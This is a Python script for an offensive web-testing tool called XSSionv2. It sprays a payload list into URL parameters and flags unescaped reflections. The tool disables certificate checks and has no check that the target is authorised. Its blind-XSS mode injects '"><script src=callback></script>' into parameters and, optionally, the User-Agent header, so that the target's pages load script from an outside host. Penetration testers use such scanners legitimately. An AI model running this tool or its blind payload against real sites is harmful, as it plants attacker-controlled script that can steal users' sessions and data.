#!/usr/bin/env python3

import sys
import argparse
import requests
import urllib.parse
import time
import html
from termcolor import colored

requests.packages.urllib3.disable_warnings()

VERSION = "2.0"

# ---------------- ASCII BANNER ----------------
def banner():
    print(colored(r"""
      __            ___           ___                        ___           ___     
     |  |\         /  /\         /  /\           ___        /  /\         /  /\    
     |  |:|       /  /::\       /  /::\         /__/\      /  /::\       /  /::|   
     |  |:|      /__/:/\:\     /__/:/\:\        \__\:\    /  /:/\:\     /  /:|:|   
     |__|:|__   _\_ \:\ \:\   _\_ \:\ \:\       /  /::\  /  /:/  \:\   /  /:/|:|__ 
 ____/__/::::\ /__/\ \:\ \:\ /__/\ \:\ \:\   __/  /:/\/ /__/:/ \__\:\ /__/:/ |:| /\
 \__\::::/~~~~ \  \:\ \:\_\/ \  \:\ \:\_\/  /__/\/:/~~  \  \:\ /  /:/ \__\/  |:|/:/
    |~~|:|      \  \:\_\:\    \  \:\_\:\    \  \::/      \  \:\  /:/      |  |:/:/ 
    |  |:|       \  \:\/:/     \  \:\/:/     \  \:\       \  \:\/:/       |__|::/  
    |__|:|        \  \::/       \  \::/       \__\/        \  \::/        /__/:/   
     \__\|         \__\/         \__\/                      \__\/         \__\/    

        XSSionv2 – Advanced XSS Scanner
        Made by: @alhamrizvii
""", "red"))

# ---------------- FEATURES ----------------
def show_features():
    banner()
    print(colored("\n[ XSSionv2 – New Features ]\n", "green"))
    print(colored("✔ Reflected XSS detection (context-aware)", "cyan"))
    print(colored("✔ Reduced false positives (HTML-escaped filter)", "cyan"))
    print(colored("✔ Blind XSS injection (callback-based)", "cyan"))
    print(colored("✔ Header-based injection (--headers)", "cyan"))
    print(colored("✔ GET & POST method support", "cyan"))
    print(colored("✔ Delay, timeout & clean CLI UX", "cyan"))
    print(colored("✔ Results saved to file", "cyan"))
    print(colored(f"\nVersion: {VERSION}", "yellow"))
    sys.exit(0)

# ---------------- ARGUMENTS ----------------
parser = argparse.ArgumentParser(
    usage="xssion -u <url> -p <payloads.txt>",
    add_help=True
)

parser.add_argument("-u", "--url", help="Target URL with parameters")
parser.add_argument("-p", "--payloads", help="Payload file")
parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
parser.add_argument("-b", "--blind", help="Blind XSS callback URL")
parser.add_argument("--delay", type=int, default=0, help="Delay between requests")
parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method")
parser.add_argument("--headers", action="store_true", help="Inject payloads into headers")
parser.add_argument("--features", action="store_true", help="Show v2 features")
parser.add_argument("--no-banner", action="store_true", help="Hide banner")

args = parser.parse_args()

# ---------------- FEATURE FLAG ----------------
if args.features:
    show_features()

# ---------------- VALIDATION ----------------
if not args.url or not args.payloads:
    banner()
    parser.print_help()
    sys.exit(1)

# ---------------- BANNER ----------------
if not args.no_banner:
    banner()

# ---------------- LOAD PAYLOADS ----------------
with open(args.payloads, "r", errors="ignore") as f:
    payloads = [x.strip() for x in f if x.strip()]

parsed = urllib.parse.urlparse(args.url)
params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

if not params:
    print(colored("[!] No parameters found in URL", "red"))
    sys.exit(1)

# ---------------- INFO ----------------
print(colored("[+] Target      :", "green"), args.url)
print(colored("[+] Parameters :", "green"), ", ".join(params.keys()))
print(colored("[+] Payloads   :", "green"), len(payloads))
print(colored("[+] Method     :", "green"), args.method)
print(colored("[+] Timeout    :", "green"), f"{args.timeout}s")
print(colored("[+] Blind XSS  :", "green"), args.blind if args.blind else "Disabled")
print(colored("-" * 60, "red"))

# ---------------- HELPERS ----------------
def is_real_reflection(payload, text):
    return payload in text and html.escape(payload) not in text

session = requests.Session()
start_time = time.time()

# ---------------- SCAN ----------------
for param in params:
    for payload in payloads:
        test_params = params.copy()
        test_params[param] = payload

        query = urllib.parse.urlencode(test_params, doseq=True)
        target = parsed._replace(query=query).geturl()

        print(colored(f"[TEST] {param} → {payload}", "yellow"))

        try:
            if args.method == "POST":
                r = session.post(args.url, data=test_params, timeout=args.timeout, verify=False)
            else:
                r = session.get(target, timeout=args.timeout, verify=False)

            if is_real_reflection(payload, r.text):
                print(colored("[REFLECTED XSS] " + target, "red"))
                with open("XSSionv2_results.txt", "a") as f:
                    f.write(f"[REFLECTED] {target} | {payload}\n")

        except Exception as e:
            print(colored(f"[ERROR] {e}", "cyan"))

        time.sleep(args.delay)

# ---------------- BLIND XSS ----------------
if args.blind:
    blind_payload = f'"><script src={args.blind}></script>'
    headers = {"User-Agent": blind_payload} if args.headers else {}

    for param in params:
        test_params = params.copy()
        test_params[param] = blind_payload
        target = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()

        print(colored("[BLIND XSS SENT] " + target, "blue"))
        try:
            session.get(target, headers=headers, timeout=args.timeout, verify=False)
        except:
            pass

# ---------------- FINISH ----------------
end_time = time.time()
print(colored("-" * 60, "red"))
print(colored("[✓] Scan completed", "green"))
print(colored("[✓] Time taken :", "green"), f"{round(end_time - start_time, 2)}s")
print(colored("[✓] Results    :", "green"), "XSSionv2_results.txt")
